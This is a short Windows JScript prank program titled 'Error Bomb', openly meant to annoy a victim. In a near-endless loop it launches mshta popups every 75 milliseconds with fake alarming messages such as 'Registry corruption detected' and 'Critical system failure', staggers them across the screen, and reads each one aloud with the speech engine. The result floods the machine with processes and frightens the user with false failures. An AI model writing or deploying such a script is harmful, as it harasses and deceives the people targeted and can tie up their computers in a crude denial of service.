// 💥 Error Bomb - When you really want to annoy them
var shell = WScript.CreateObject("WScript.Shell");
var voice = WScript.CreateObject("SAPI.SpVoice");

var messages = [
    "Critical system failure.",
    "Memory access violation.",
    "Unexpected kernel response.",
    "Disk read error.",
    "Thread exception caught.",
    "Insufficient system resources.",
    "Registry corruption detected.",
    "Access violation at 0x0000FF",
    "Unrecoverable application fault.",
];

var startX = 0;
var startY = 0;

var offsetX = 40;
var offsetY = 40;

var count = 99999999999999999999999999999999;

for (var i = 0; i < count; i++) {
    var msg = messages[Math.floor(Math.random() * messages.length)];
    var code =
        "0x" +
        Math.floor(Math.random() * 65536)
            .toString(16)
            .toUpperCase();
    var popupText = "[ERROR " + code + "] " + msg;

    var x = startX + i * offsetX;
    var y = startY + i * offsetY;

    if (x > 1600) x = 0;
    if (y > 900) y = 0;

    var cmd =
        'mshta "javascript:moveTo(' +
        x +
        "," +
        y +
        ");alert('" +
        popupText.replace(/'/g, "\\'") +
        "');close();\"";
    shell.Run(cmd, 0, false);

    voice.Speak(msg, 1);

    WScript.Sleep(75); 
}
